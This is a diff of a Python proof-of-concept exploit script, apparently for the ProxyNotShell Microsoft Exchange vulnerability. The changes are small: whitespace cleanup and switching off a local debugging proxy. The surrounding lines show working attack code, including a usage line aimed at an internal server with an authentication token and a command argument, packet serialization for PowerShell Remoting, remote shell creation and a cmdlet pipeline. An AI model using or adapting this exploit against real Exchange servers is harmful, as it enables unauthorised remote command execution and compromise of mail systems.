@@ -18,14 +18,15 @@ import requests
 '''
 C:\Users\Adam\Desktop\ProxyNotShell-PoC-main\ProxyNotShell-PoC-main>python2 poc_aug3.py https://10.0.102.210 "VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==" 1
 '''
-proxies = {"https":"http://127.0.0.1:8080"}
+#proxies = {"https":"http://127.0.0.1:8080"}
+proxies = {}
 
 base_url = sys.argv[1]
 token=sys.argv[2]
 CMD=sys.argv[3]
 
 session = requests.Session()
- 
+
 
 def post_request(original_url, headers, data = None, cookies = {}):
 	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
@@ -74,12 +75,12 @@ class BasePacket:
 			self.Flags,
 			struct.pack('>I', BlobLength),
 			Blob ])
-		return output 
+		return output
 
 	def deserialize(self, data):
 		total_len = len(data)
 
-		i = 0 
+		i = 0
 		self.ObjectId = struct.unpack('>Q', data[i:i+8])[0]
 		i = i + 8
 		self.FragmentId = struct.unpack('>Q', data[i:i+8])[0]
@@ -177,7 +178,7 @@ def create_powershell_shell(SessionId, RPID):
 		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
 		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
 		<w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">
-		
+
 			<w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
 		</w:OptionSet>
 		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
@@ -256,7 +257,7 @@ def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
 	print('[+] Create powershell pipeline')
 	c = PSCommand(3, RPID, PID, commandData)
 	command_arguments = base64.b64encode(c.serialize())
-	
+
 	MessageID = uuid.uuid4()
 	OperationID = uuid.uuid4()
 	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
